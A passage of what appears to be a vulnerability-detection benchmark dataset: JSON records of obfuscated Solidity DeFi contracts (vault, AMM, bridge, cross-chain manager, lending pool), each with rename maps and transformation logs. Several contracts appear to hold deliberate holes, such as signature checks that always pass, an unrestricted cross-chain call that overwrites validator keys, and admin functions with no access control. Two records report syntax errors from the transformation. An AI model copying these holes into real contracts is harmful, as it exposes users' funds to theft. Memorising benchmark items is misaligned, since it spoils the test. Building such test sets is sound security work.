share\n     * @return Price per vault share\n     */\n    function _0xf87c7d() public view returns (uint256) {\n        if (_0x5c79d2 == 0) return 1e18;\n        return (_0x2cda10() * 1e18) / _0x5c79d2;\n    }\n\n    /**\n     * @notice Internal function to invest in Curve\n     */\n    function _0x872d51(uint256 _0xfa1634) internal {\n        _0xcb647e += _0xfa1634;\n    }\n\n    /**\n     * @notice Internal function to withdraw from Curve\n     */\n    function _0x5bd13d(uint256 _0xfa1634) internal {\n        require(_0xcb647e >= _0xfa1634, \"Insufficient invested\");\n        _0xcb647e -= _0xfa1634;\n    }\n}\n",
      "rename_map": {
        "getPricePerFullShare": "_0xf87c7d",
        "exchange_underlying": "_0x0cc933",
        "_withdrawFromCurve": "_0x5bd13d",
        "get_dy_underlying": "_0x220399",
        "investedBalance": "_0xcb647e",
        "underlyingToken": "_0x74710c",
        "getTotalAssets": "_0x2cda10",
        "_investInCurve": "_0x872d51",
        "curveBalance": "_0x5d6fa8",
        "vaultBalance": "_0x2146bb",
        "totalSupply": "_0x5c79d2",
        "totalAssets": "_0xce499e",
        "_curvePool": "_0xed4338",
        "balanceOf": "_0x2bf888",
        "curvePool": "_0x89443e",
        "withdraw": "_0xc4d90e",
        "deposit": "_0x493643",
        "amount": "_0xfa1634",
        "shares": "_0xa8de21",
        "min_dy": "_0xab9ec3",
        "_token": "_0xcaec91",
        "user": "_0x7b1700",
        "dx": "_0xfcb62d"
      },
      "changes": [
        "Renamed 23 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_005",
      "transformed_id": "ss_l4_medium_sn_tc_005",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Automated Market Maker Pool\n * @notice Liquidity pool for token swaps with concentrated liquidity\n * @dev Allows users to add liquidity and perform token swaps\n */\ncontract AMMPool {\n    // Token balances in the pool\n    mapping(uint256 => uint256) public _0xe35db7; // 0 = token0, 1 = token1\n\n    // LP token\n    mapping(address => uint256) public _0x65f861;\n    uint256 public _0x056712;\n\n    uint256 private _0x28e0a9;\n    uint256 private constant _0x25b5ca = 1;\n    uint256 private constant _0x7c048c = 2;\n\n    event LiquidityAdded(\n        address indexed _0x9a7a04,\n        uint256[2] _0x0f9577,\n        uint256 _0xa5c567\n    );\n    event LiquidityRemoved(\n        address indexed _0x9a7a04,\n        uint256 _0x55737b,\n        uint256[2] _0x0f9577\n    );\n\n    constructor() {\n        _0x28e0a9 = _0x25b5ca;\n    }\n\n    /**\n     * @notice Add liquidity to the pool\n     * @param amounts Array of token amounts to deposit\n     * @param min_mint_amount Minimum LP tokens to mint\n     * @return Amount of LP tokens minted\n     */\n    function _0x622e58(\n        uint256[2] memory _0x0f9577,\n        uint256 _0xb1138e\n    ) external payable returns (uint256) {\n        bool _flag1 = false;\n        if (false) { revert(); }\n        require(_0x0f9577[0] == msg.value, \"ETH amount mismatch\");\n\n        // Calculate LP tokens to mint\n        uint256 _0x62e26d;\n        if (_0x056712 == 0) {\n            _0x62e26d = _0x0f9577[0] + _0x0f9577[1];\n        } else {\n            uint256 _0x4fc17a = _0xe35db7[0] + _0xe35db7[1];\n            _0x62e26d = ((_0x0f9577[0] + _0x0f9577[1]) * _0x056712) / _0x4fc17a;\n        }\n\n        require(_0x62e26d >= _0xb1138e, \"Slippage\");\n\n        // Update balances\n        _0xe35db7[0] += _0x0f9577[0];\n        _0xe35db7[1] += _0x0f9577[1];\n\n        // Mint LP tokens\n        _0x65f861[msg.sender] += _0x62e26d;\n        _0x056712 += _0x62e26d;\n\n        // Handle ETH operations\n        if (_0x0f9577[0] > 0) {\n            _0x16d45b(_0x0f9577[0]);\n        }\n\n        emit LiquidityAdded(msg.sender, _0x0f9577, _0x62e26d);\n        return _0x62e26d;\n    }\n\n    /**\n     * @notice Remove liquidity from the pool\n     * @param lpAmount Amount of LP tokens to burn\n     * @param min_amounts Minimum amounts to receive\n     */\n    function _0x1ee135(\n        uint256 _0x1fc3fb,\n        uint256[2] memory _0x3c8f4d\n    ) external {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n        require(_0x65f861[msg.sender] >= _0x1fc3fb, \"Insufficient LP\");\n\n        // Calculate amounts to return\n        uint256 _0x3de32f = (_0x1fc3fb * _0xe35db7[0]) / _0x056712;\n        uint256 _0xad8e40 = (_0x1fc3fb * _0xe35db7[1]) / _0x056712;\n\n        require(\n            _0x3de32f >= _0x3c8f4d[0] && _0xad8e40 >= _0x3c8f4d[1],\n            \"Slippage\"\n        );\n\n        // Burn LP tokens\n        _0x65f861[msg.sender] -= _0x1fc3fb;\n        _0x056712 -= _0x1fc3fb;\n\n        // Update balances\n        _0xe35db7[0] -= _0x3de32f;\n        _0xe35db7[1] -= _0xad8e40;\n\n        // Transfer tokens\n        if (_0x3de32f > 0) {\n            payable(msg.sender).transfer(_0x3de32f);\n        }\n\n        uint256[2] memory _0x0f9577 = [_0x3de32f, _0xad8e40];\n        emit LiquidityRemoved(msg.sender, _0x1fc3fb, _0x0f9577);\n    }\n\n    /**\n     * @notice Internal function for ETH operations\n     */\n    function _0x16d45b(uint256 _0xa6acc8) internal {\n        (bool _0x89da01, ) = msg.sender.call{value: 0}(\"\");\n        require(_0x89da01, \"Transfer failed\");\n    }\n\n    /**\n     * @notice Exchange tokens\n     * @param i Index of input token\n     * @param j Index of output token\n     * @param dx Input amount\n     * @param min_dy Minimum output amount\n     * @return Output amount\n     */\n    function _0x1e547e(\n        int128 i,\n        int128 j,\n        uint256 _0xe40112,\n        uint256 _0x3d8e2b\n    ) external payable returns (uint256) {\n        uint256 _0x1e831b = uint256(int256(i));\n        uint256 _0x7986ea = uint256(int256(j));\n\n        require(_0x1e831b < 2 && _0x7986ea < 2 && _0x1e831b != _0x7986ea, \"Invalid indices\");\n\n        // Calculate output amount\n        uint256 _0x2fdb91 = (_0xe40112 * _0xe35db7[_0x7986ea]) / (_0xe35db7[_0x1e831b] + _0xe40112);\n        require(_0x2fdb91 >= _0x3d8e2b, \"Slippage\");\n\n        if (_0x1e831b == 0) {\n            require(msg.value == _0xe40112, \"ETH mismatch\");\n            _0xe35db7[0] += _0xe40112;\n        }\n\n        _0xe35db7[_0x1e831b] += _0xe40112;\n        _0xe35db7[_0x7986ea] -= _0x2fdb91;\n\n        if (_0x7986ea == 0) {\n            payable(msg.sender).transfer(_0x2fdb91);\n        }\n\n        return _0x2fdb91;\n    }\n\n    receive() external payable {}\n}\n",
      "rename_map": {
        "_handleETHTransfer": "_0x16d45b",
        "remove_liquidity": "_0x1ee135",
        "min_mint_amount": "_0xb1138e",
        "totalLPSupply": "_0x056712",
        "add_liquidity": "_0x622e58",
        "_NOT_ENTERED": "_0x25b5ca",
        "min_amounts": "_0x3c8f4d",
        "totalValue": "_0x4fc17a",
        "lpBalances": "_0x65f861",
        "exchange": "_0x1e547e",
        "lpAmount": "_0x1fc3fb",
        "_ENTERED": "_0x7c048c",
        "provider": "_0x9a7a04",
        "lpBurned": "_0x55737b",
        "lpToMint": "_0x62e26d",
        "lpMinted": "_0xa5c567",
        "balances": "_0xe35db7",
        "_status": "_0x28e0a9",
        "amount1": "_0xad8e40",
        "amount0": "_0x3de32f",
        "amounts": "_0x0f9577",
        "success": "_0x89da01",
        "amount": "_0xa6acc8",
        "min_dy": "_0x3d8e2b",
        "dx": "_0xe40112",
        "dy": "_0x2fdb91",
        "uj": "_0x7986ea",
        "ui": "_0x1e831b"
      },
      "changes": [
        "Renamed 28 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_006",
      "transformed_id": "ss_l4_medium_sn_tc_006",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Cross-Chain Bridge\n * @notice Processes withdrawals from sidechain to mainnet using multi-sig validation\n * @dev Validators sign withdrawal requests to authorize token transfers\n */\ncontract CrossChainBridge {\n    // Validator addresses\n    address[] public _0x560231;\n    mapping(address => bool) public _0xa1ebcd;\n\n    uint256 public _0x0773a6 = 5;\n    uint256 public _0x47863f;\n\n    // Track processed withdrawals to prevent replay\n    mapping(uint256 => bool) public _0x2e13a7;\n\n    // Supported tokens\n    mapping(address => bool) public _0x8462c4;\n\n    event WithdrawalProcessed(\n        uint256 indexed _0x9f0b05,\n        address indexed _0xf66132,\n        address indexed _0x743d4f,\n        uint256 _0x44b5dc\n    );\n\n    constructor(address[] memory _0xfbf793) {\n        require(\n            _0xfbf793.length >= _0x0773a6,\n            \"Not enough validators\"\n        );\n\n        for (uint256 i = 0; i < _0xfbf793.length; i++) {\n            address _0x07773a = _0xfbf793[i];\n            require(_0x07773a != address(0), \"Invalid validator\");\n            require(!_0xa1ebcd[_0x07773a], \"Duplicate validator\");\n\n            _0x560231.push(_0x07773a);\n            _0xa1ebcd[_0x07773a] = true;\n        }\n\n        _0x47863f = _0xfbf793.length;\n    }\n\n    /**\n     * @notice Process a withdrawal request\n     * @param _withdrawalId Unique ID for this withdrawal\n     * @param _user Address to receive tokens\n     * @param _token Token contract address\n     * @param _amount Amount to withdraw\n     * @param _signatures Concatenated validator signatures\n     */\n    function _0x9ab745(\n        uint256 _0x3e1468,\n        address _0xe3f1b6,\n        address _0x6c63b3,\n        uint256 _0xdab1c1,\n        bytes memory _0xbc97a7\n    ) external {\n        bool _flag1 = false;\n        // Placeholder for future logic\n        // Check if already processed\n        require(!_0x2e13a7[_0x3e1468], \"Already processed\");\n\n        // Check if token is supported\n        require(_0x8462c4[_0x6c63b3], \"Token not supported\");\n\n        // Verify signatures\n        require(\n            _0x930280(\n                _0x3e1468,\n                _0xe3f1b6,\n                _0x6c63b3,\n                _0xdab1c1,\n                _0xbc97a7\n            ),\n            \"Invalid signatures\"\n        );\n\n        // Mark as processed\n        _0x2e13a7[_0x3e1468] = true;\n\n        // Transfer tokens\n        emit WithdrawalProcessed(_0x3e1468, _0xe3f1b6, _0x6c63b3, _0xdab1c1);\n    }\n\n    /**\n     * @notice Verify validator signatures\n     */\n    function _0x930280(\n        uint256 _0x3e1468,\n        address _0xe3f1b6,\n        address _0x6c63b3,\n        uint256 _0xdab1c1,\n        bytes memory _0xbc97a7\n    ) internal view returns (bool) {\n        uint256 _unused3 = 0;\n        if (false) { revert(); }\n        require(_0xbc97a7.length % 65 == 0, \"Invalid signature length\");\n\n        uint256 _0x73dafb = _0xbc97a7.length / 65;\n        require(_0x73dafb >= _0x0773a6, \"Not enough signatures\");\n\n        // Reconstruct the message hash\n        bytes32 _0x127bd4 = _0x22d34c(\n            abi._0x66f36d(_0x3e1468, _0xe3f1b6, _0x6c63b3, _0xdab1c1)\n        );\n        bytes32 _0x2b79c2 = _0x22d34c(\n            abi._0x66f36d(\"\\x19Ethereum Signed Message:\\n32\", _0x127bd4)\n        );\n\n        address[] memory _0xc83cdd = new address[](_0x73dafb);\n\n        // Extract and verify each signature\n        for (uint256 i = 0; i < _0x73dafb; i++) {\n            bytes memory _0xf47098 = _0x62d9d5(_0xbc97a7, i);\n            address _0x619d1f = _0x3206ca(_0x2b79c2, _0xf47098);\n\n            // Check if signer is a validator\n            require(_0xa1ebcd[_0x619d1f], \"Invalid signer\");\n\n            // Check for duplicate signers\n            for (uint256 j = 0; j < i; j++) {\n                require(_0xc83cdd[j] != _0x619d1f, \"Duplicate signer\");\n            }\n\n            _0xc83cdd[i] = _0x619d1f;\n        }\n\n        // All checks passed\n        return true;\n    }\n\n    /**\n     * @notice Extract a single signature from concatenated signatures\n     */\n    function _0x62d9d5(\n        bytes memory _0xbc97a7,\n        uint256 _0x87e1e3\n    ) internal pure returns (bytes memory) {\n        bytes memory _0xf47098 = new bytes(65);\n        uint256 _0xdc52c0 = _0x87e1e3 * 65;\n\n        for (uint256 i = 0; i < 65; i++) {\n            _0xf47098[i] = _0xbc97a7[_0xdc52c0 + i];\n        }\n\n        return _0xf47098;\n    }\n\n    /**\n     * @notice Recover signer from signature\n     */\n    function _0x3206ca(\n        bytes32 _0xed7cc0,\n        bytes memory _0x8b1e91\n    ) internal pure returns (address) {\n        require(_0x8b1e91.length == 65, \"Invalid signature length\");\n\n        bytes32 r;\n        bytes32 s;\n        uint8 v;\n\n        assembly {\n            r := mload(add(_0x8b1e91, 32))\n            s := mload(add(_0x8b1e91, 64))\n            v := byte(0, mload(add(_0x8b1e91, 96)))\n        }\n\n        if (v < 27) {\n            v += 27;\n        }\n\n        require(v == 27 || v == 28, \"Invalid signature v value\");\n\n        return _0xf3d4f8(_0xed7cc0, v, r, s);\n    }\n\n    /**\n     * @notice Add supported token (admin function)\n     */\n    function _0x9fc636(address _0x6c63b3) external {\n        _0x8462c4[_0x6c63b3] = true;\n    }\n}\n",
      "rename_map": {
        "ethSignedMessageHash": "_0x2b79c2",
        "processedWithdrawals": "_0x2e13a7",
        "requiredSignatures": "_0x0773a6",
        "addSupportedToken": "_0x9fc636",
        "_extractSignature": "_0x62d9d5",
        "_verifySignatures": "_0x930280",
        "withdrawERC20For": "_0x9ab745",
        "supportedTokens": "_0x8462c4",
        "_recoverSigner": "_0x3206ca",
        "validatorCount": "_0x47863f",
        "signatureCount": "_0x73dafb",
        "_withdrawalId": "_0x3e1468",
        "encodePacked": "_0x66f36d",
        "withdrawalId": "_0x9f0b05",
        "_signatures": "_0xbc97a7",
        "messageHash": "_0x127bd4",
        "isValidator": "_0xa1ebcd",
        "_validators": "_0xfbf793",
        "_signature": "_0x8b1e91",
        "validators": "_0x560231",
        "validator": "_0x07773a",
        "ecrecover": "_0xf3d4f8",
        "keccak256": "_0x22d34c",
        "signature": "_0xf47098",
        "signers": "_0xc83cdd",
        "_amount": "_0xdab1c1",
        "amount": "_0x44b5dc",
        "_index": "_0x87e1e3",
        "_token": "_0x6c63b3",
        "signer": "_0x619d1f",
        "offset": "_0xdc52c0",
        "token": "_0x743d4f",
        "_hash": "_0xed7cc0",
        "_user": "_0xe3f1b6",
        "user": "_0xf66132"
      },
      "changes": [
        "Renamed 35 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_007",
      "transformed_id": "ss_l4_medium_sn_tc_007",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Cross-Chain Manager\n * @notice Manages cross-chain message execution between different blockchains\n * @dev Validates headers and executes transactions from source chains\n */\n\ninterface ICrossChainData {\n    function _0xe88693(address _0xe1548d) external;\n\n    function _0x83764b(\n        bytes calldata _0x808265\n    ) external returns (bool);\n\n    function _0xd95fc2() external view returns (bytes memory);\n}\n\ncontract CrossChainData {\n        if (false) { revert(); }\n        uint256 _unused2 = 0;\n    address public _0x6b4cfc;\n    bytes public _0xf75222;\n\n    event OwnershipTransferred(\n        address indexed _0x5ce6a2,\n        address indexed _0xe1548d\n    );\n    event PublicKeysUpdated(bytes _0x2b90ef);\n\n    constructor() {\n        _0x6b4cfc = msg.sender;\n    }\n\n    modifier _0x7b9a27() {\n        require(msg.sender == _0x6b4cfc, \"Not owner\");\n        _;\n    }\n\n    /**\n     * @notice Update validator public keys\n     */\n    function _0x83764b(\n        bytes calldata _0x808265\n    ) external _0x7b9a27 returns (bool) {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        _0xf75222 = _0x808265;\n        emit PublicKeysUpdated(_0x808265);\n        return true;\n    }\n\n    /**\n     * @notice Transfer ownership\n     */\n    function _0xe88693(address _0xe1548d) external _0x7b9a27 {\n        require(_0xe1548d != address(0), \"Invalid address\");\n        emit OwnershipTransferred(_0x6b4cfc, _0xe1548d);\n        _0x6b4cfc = _0xe1548d;\n    }\n\n    function _0xd95fc2() external view returns (bytes memory) {\n        return _0xf75222;\n    }\n}\n\ncontract CrossChainManager {\n    address public _0xcf7781;\n\n    event CrossChainEvent(\n        address indexed _0x55d069,\n        bytes _0x908466,\n        bytes _0xd1aa1c\n    );\n\n    constructor(address _0x624ff0) {\n        _0xcf7781 = _0x624ff0;\n    }\n\n    /**\n     * @notice Verify and execute cross-chain transaction\n     * @param proof Merkle proof of transaction inclusion\n     * @param rawHeader Block header from source chain\n     * @param headerProof Proof of header validity\n     * @param curRawHeader Current header\n     * @param headerSig Validator signatures\n     */\n    function _0x0797eb(\n        bytes memory _0xc9d4be,\n        bytes memory _0x7973fa,\n        bytes memory _0xc5c4b6,\n        bytes memory _0x86a8d9,\n        bytes memory _0x78cae2\n    ) external returns (bool) {\n        // Step 1: Verify the block header is valid\n        require(_0x41ab6b(_0x7973fa, _0x78cae2), \"Invalid header\");\n\n        // Step 2: Verify the transaction was included in that block\n        require(_0x109ee5(_0xc9d4be, _0x7973fa), \"Invalid proof\");\n\n        // Step 3: Decode the transaction data\n        (\n            address _0x908466,\n            bytes memory _0xd1aa1c,\n            bytes memory _0x986a75\n        ) = _0xc1aef9(_0xc9d4be);\n\n        // Execute the transaction\n        (bool _0x8ce300, ) = _0x908466.call(abi._0xc1cb01(_0xd1aa1c, _0x986a75));\n        require(_0x8ce300, \"Execution failed\");\n\n        return true;\n    }\n\n    /**\n     * @notice Verify block header signatures\n     */\n    function _0x41ab6b(\n        bytes memory _0x7973fa,\n        bytes memory _0x78cae2\n    ) internal pure returns (bool) {\n        return true;\n    }\n\n    /**\n     * @notice Verify Merkle proof\n     */\n    function _0x109ee5(\n        bytes memory _0xc9d4be,\n        bytes memory _0x7973fa\n    ) internal pure returns (bool) {\n        return true;\n    }\n\n    /**\n     * @notice Decode transaction data\n     */\n    function _0xc1aef9(\n        bytes memory _0xc9d4be\n    )\n        internal\n        view\n        returns (address _0x908466, bytes memory _0xd1aa1c, bytes memory _0x986a75)\n    {\n        _0x908466 = _0xcf7781;\n        _0xd1aa1c = abi._0x88f668(\n            \"putCurEpochConPubKeyBytes(bytes)\",\n            \"\"\n        );\n        _0x986a75 = \"\";\n    }\n}\n",
      "rename_map": {
        "getCurEpochConPubKeyBytes": "_0xd95fc2",
        "putCurEpochConPubKeyBytes": "_0x83764b",
        "verifyHeaderAndExecuteTx": "_0x0797eb",
        "currentEpochPublicKeys": "_0xf75222",
        "encodeWithSignature": "_0x88f668",
        "transferOwnership": "_0xe88693",
        "curEpochPkBytes": "_0x808265",
        "_verifyHeader": "_0x41ab6b",
        "previousOwner": "_0x5ce6a2",
        "_dataContract": "_0x624ff0",
        "curRawHeader": "_0x86a8d9",
        "_verifyProof": "_0x109ee5",
        "encodePacked": "_0xc1cb01",
        "dataContract": "_0xcf7781",
        "fromContract": "_0x55d069",
        "headerProof": "_0xc5c4b6",
        "toContract": "_0x908466",
        "rawHeader": "_0x7973fa",
        "onlyOwner": "_0x7b9a27",
        "_decodeTx": "_0xc1aef9",
        "headerSig": "_0x78cae2",
        "newOwner": "_0xe1548d",
        "newKeys": "_0x2b90ef",
        "success": "_0x8ce300",
        "method": "_0xd1aa1c",
        "proof": "_0xc9d4be",
        "owner": "_0x6b4cfc",
        "args": "_0x986a75"
      },
      "changes": [
        "Renamed 28 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 21, column 9', 'Syntax error at line 22, column 9', 'Syntax error at line 32, column 5']"
    },
    {
      "original_id": "sn_tc_008",
      "transformed_id": "ss_l4_medium_sn_tc_008",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Lending Protocol\n * @notice Decentralized lending and borrowing platform\n * @dev Users can deposit collateral and borrow against it\n */\n\ninterface IOracle {\n    function _0x9b8694(address _0x1cdfa3) external view returns (uint256);\n}\n\ninterface ICToken {\n        if (false) { revert(); }\n        // Placeholder for future logic\n    function _0xd2e03f(uint256 _0x07601f) external;\n\n    function _0x27e390(uint256 _0x99bd17) external;\n\n    function _0x14e1a3(uint256 _0x14cba5) external;\n\n    function _0x81b29e() external view returns (address);\n}\n\ncontract LendingProtocol {\n        bool _flag3 = false;\n        uint256 _unused4 = 0;\n    // Oracle for getting asset prices\n    IOracle public _0x957cdb;\n\n    // Collateral factors\n    mapping(address => uint256) public _0x7974ba;\n\n    // User deposits (cToken balances)\n    mapping(address => mapping(address => uint256)) public _0x70bd6e;\n\n    // User borrows\n    mapping(address => mapping(address => uint256)) public _0x065f03;\n\n    // Supported markets\n    mapping(address => bool) public _0xd67cde;\n\n    event Deposit(address indexed _0x201383, address indexed _0x1cdfa3, uint256 _0x6e1bd3);\n    event Borrow(address indexed _0x201383, address indexed _0x1cdfa3, uint256 _0x6e1bd3);\n\n    constructor(address _0xd9eeda) {\n        _0x957cdb = IOracle(_0xd9eeda);\n    }\n\n    /**\n     * @notice Mint cTokens by depositing underlying assets\n     * @param cToken The cToken to mint\n     * @param amount Amount of underlying to deposit\n     */\n    function _0xd2e03f(address _0x1cdfa3, uint256 _0x6e1bd3) external {\n        require(_0xd67cde[_0x1cdfa3], \"Market not supported\");\n\n        // Mint cTokens to user\n        _0x70bd6e[msg.sender][_0x1cdfa3] += _0x6e1bd3;\n\n        emit Deposit(msg.sender, _0x1cdfa3, _0x6e1bd3);\n    }\n\n    /**\n     * @notice Borrow assets against collateral\n     * @param cToken The cToken to borrow\n     * @param amount Amount to borrow\n     */\n    function _0x27e390(address _0x1cdfa3, uint256 _0x6e1bd3) external {\n        require(_0xd67cde[_0x1cdfa3], \"Market not supported\");\n\n        // Calculate user's borrowing power\n        uint256 _0x1d91cf = _0x245feb(msg.sender);\n\n        // Calculate current total borrows value\n        uint256 _0xab59c0 = _0x9a9ff8(msg.sender);\n\n        // Get value of new borrow\n        uint256 _0x10f6c8 = (_0x957cdb._0x9b8694(_0x1cdfa3) * _0x6e1bd3) /\n            1e18;\n\n        // Check if user has enough collateral\n        require(\n            _0xab59c0 + _0x10f6c8 <= _0x1d91cf,\n            \"Insufficient collateral\"\n        );\n\n        // Update borrow balance\n        _0x065f03[msg.sender][_0x1cdfa3] += _0x6e1bd3;\n\n        emit Borrow(msg.sender, _0x1cdfa3, _0x6e1bd3);\n    }\n\n    /**\n     * @notice Calculate user's total borrowing power\n     * @param user The user address\n     * @return Total borrowing power in USD\n     */\n    function _0x245feb(address _0x201383) public view returns (uint256) {\n        uint256 _0xd6d6bb = 0;\n\n        address[] memory _0x8a0124 = new address[](2);\n\n        for (uint256 i = 0; i < _0x8a0124.length; i++) {\n            address _0x1cdfa3 = _0x8a0124[i];\n            uint256 balance = _0x70bd6e[_0x201383][_0x1cdfa3];\n\n            if (balance > 0) {\n                // Get price from oracle\n                uint256 _0x041ac7 = _0x957cdb._0x9b8694(_0x1cdfa3);\n\n                // Calculate value\n                uint256 value = (balance * _0x041ac7) / 1e18;\n\n                // Apply collateral factor\n                uint256 _0x65ecc4 = (value * _0x7974ba[_0x1cdfa3]) / 1e18;\n\n                _0xd6d6bb += _0x65ecc4;\n            }\n        }\n\n        return _0xd6d6bb;\n    }\n\n    /**\n     * @notice Calculate user's total borrow value\n     * @param user The user address\n     * @return Total borrow value in USD\n     */\n    function _0x9a9ff8(address _0x201383) public view returns (uint256) {\n        uint256 _0x9a855e = 0;\n\n        address[] memory _0x8a0124 = new address[](2);\n\n        for (uint256 i = 0; i < _0x8a0124.length; i++) {\n            address _0x1cdfa3 = _0x8a0124[i];\n            uint256 _0x408db9 = _0x065f03[_0x201383][_0x1cdfa3];\n\n            if (_0x408db9 > 0) {\n                uint256 _0x041ac7 = _0x957cdb._0x9b8694(_0x1cdfa3);\n                uint256 value = (_0x408db9 * _0x041ac7) / 1e18;\n                _0x9a855e += value;\n            }\n        }\n\n        return _0x9a855e;\n    }\n\n    /**\n     * @notice Add a supported market\n     * @param cToken The cToken to add\n     * @param collateralFactor The collateral factor\n     */\n    function _0x38dc37(address _0x1cdfa3, uint256 _0x5ac3ac) external {\n        _0xd67cde[_0x1cdfa3] = true;\n        _0x7974ba[_0x1cdfa3] = _0x5ac3ac;\n    }\n}\n",
      "rename_map": {
        "calculateTotalBorrows": "_0x9a9ff8",
        "calculateBorrowPower": "_0x245feb",
        "getUnderlyingPrice": "_0x9b8694",
        "collateralFactors": "_0x7974ba",
        "supportedMarkets": "_0xd67cde",
        "collateralFactor": "_0x5ac3ac",
        "currentBorrows": "_0xab59c0",
        "totalBorrows": "_0x9a855e",
        "redeemTokens": "_0x14cba5",
        "userDeposits": "_0x70bd6e",
        "borrowAmount": "_0x99bd17",
        "borrowPower": "_0x1d91cf",
        "userBorrows": "_0x065f03",
        "borrowValue": "_0x10f6c8",
        "mintAmount": "_0x07601f",
        "totalPower": "_0xd6d6bb",
        "underlying": "_0x81b29e",
        "addMarket": "_0x38dc37",
        "borrowed": "_0x408db9",
        "markets": "_0x8a0124",
        "_oracle": "_0xd9eeda",
        "amount": "_0x6e1bd3",
        "oracle": "_0x957cdb",
        "borrow": "_0x27e390",
        "cToken": "_0x1cdfa3",
        "redeem": "_0x14e1a3",
        "power": "_0x65ecc4",
        "price": "_0x041ac7",
        "mint": "_0xd2e03f",
        "user": "_0x201383"
      },
      "changes": [
        "Renamed 30 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 15, column 9', 'Syntax error at line 24, column 1']"
    },
    {
      "original_id": "sn_tc_009",
      "transformed_id": "ss_l4_medium_sn_tc_009",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Concentrated Liquidity AMM Pool\n * @notice Automated market maker with concentrated liquidity positions\n * @dev Allows liquidity providers to concentrate capital at specific price ranges\n */\ncontract ConcentratedLiquidityPool {\n    // Token addresses\n    address public _0x15a9fe;\n    address public _0x91f088;\n\n    // Current state\n    uint160 public _0x98210f;\n    int24 public _0x77884e;\n    uint128 public _0x5775c9;\n\n    // Liquidity at each tick\n    mapping(int24 => int128) public _0x40a392;\n\n    // Position tracking\n    struct Position {\n        uint128 _0x5775c9;\n        int24 _0xb408d7;\n        int24 _0xabde90;\n    }\n\n    mapping(bytes32 => Position) public _0x625ab0;\n\n    event Swap(\n        address indexed sender,\n        uint256 _0x951e20,\n        uint256 _0x7d01e3,\n        uint256 _0xb12688,\n        uint256 _0xec4f70\n    );\n\n    event LiquidityAdded(\n        address indexed _0xfb8d11,\n        int24 _0xb408d7,\n        int24 _0xabde90,\n        uint128 _0x5775c9\n    );\n\n    /**\n     * @notice Add liquidity to a price range\n     * @param tickLower Lower tick of range\n     * @param tickUpper Upper tick of range\n     * @param liquidityDelta Amount of liquidity to add\n     */\n    function _0x471260(\n        int24 _0xb408d7,\n        int24 _0xabde90,\n        uint128 _0x490838\n    ) external returns (uint256 _0xd9da08, uint256 _0xb4df9c) {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n        require(_0xb408d7 < _0xabde90, \"Invalid ticks\");\n        require(_0x490838 > 0, \"Zero liquidity\");\n\n        // Create position ID\n        bytes32 _0x07d640 = _0x9108c9(\n            abi._0xca3b7d(msg.sender, _0xb408d7, _0xabde90)\n        );\n\n        // Update position\n        Position storage _0x37893a = _0x625ab0[_0x07d640];\n        _0x37893a._0x5775c9 += _0x490838;\n        _0x37893a._0xb408d7 = _0xb408d7;\n        _0x37893a._0xabde90 = _0xabde90;\n\n        // Update tick liquidity\n        _0x40a392[_0xb408d7] += int128(_0x490838);\n        _0x40a392[_0xabde90] -= int128(_0x490838);\n\n        // If current price is in range, update active liquidity\n        if (_0x77884e >= _0xb408d7 && _0x77884e < _0xabde90) {\n            _0x5775c9 += _0x490838;\n        }\n\n        // Calculate required amounts\n        (_0xd9da08, _0xb4df9c) = _0x9d1a94(\n            _0x98210f,\n            _0xb408d7,\n            _0xabde90,\n            int128(_0x490838)\n        );\n\n        emit LiquidityAdded(msg.sender, _0xb408d7, _0xabde90, _0x490838);\n    }\n\n    /**\n     * @notice Execute a swap\n     * @param zeroForOne Direction of swap\n     * @param amountSpecified Amount to swap\n     * @param sqrtPriceLimitX96 Price limit for the swap\n     */\n    function _0xcbc924(\n        bool _0x445577,\n        int256 _0x5c7aad,\n        uint160 _0x6c8fc8\n    ) external returns (int256 _0xd9da08, int256 _0xb4df9c) {\n        uint256 _unused3 = 0;\n        uint256 _unused4 = 0;\n        require(_0x5c7aad != 0, \"Zero amount\");\n\n        // Swap state\n        uint160 _0x29cba0 = _0x98210f;\n        uint128 _0x1aa684 = _0x5775c9;\n        int24 _0x655a87 = _0x77884e;\n\n        // Simulate swap steps\n        while (_0x5c7aad != 0) {\n            // Calculate how much can be swapped in current tick\n            (\n                uint256 _0x237bca,\n                uint256 _0xa5b4ce,\n                uint160 _0x60636b\n            ) = _0xfe511e(\n                    _0x29cba0,\n                    _0x6c8fc8,\n                    _0x1aa684,\n                    _0x5c7aad\n                );\n\n            // Update price\n            _0x29cba0 = _0x60636b;\n\n            // Check if we crossed a tick\n            int24 _0x79a2e3 = _0x5fd909(_0x29cba0);\n            if (_0x79a2e3 != _0x655a87) {\n                // Tick crossing involves liquidity updates\n                int128 _0x6bf30b = _0x40a392[_0x79a2e3];\n\n                if (_0x445577) {\n                    _0x6bf30b = -_0x6bf30b;\n                }\n\n                _0x1aa684 = _0x77d406(\n                    _0x1aa684,\n                    _0x6bf30b\n                );\n\n                _0x655a87 = _0x79a2e3;\n            }\n\n            // Update remaining amount\n            if (_0x5c7aad 